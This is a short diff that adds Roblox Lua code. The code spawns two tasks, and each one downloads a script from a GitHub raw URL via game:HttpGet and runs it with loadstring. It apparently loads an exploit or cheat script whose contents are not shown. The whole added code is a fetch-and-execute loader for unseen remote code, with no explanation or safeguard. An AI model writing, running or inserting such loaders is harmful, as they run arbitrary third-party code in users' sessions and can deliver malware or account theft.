@@ -1,0 +1,7 @@
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/morrisongriffin13-web/sacredpsychic/refs/heads/main/TheLOadinfg"))()
+end)
+
+task.spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/morrisongriffin13-web/sacredpsychic/refs/heads/main/67sabscriptshaha"))()
+end)
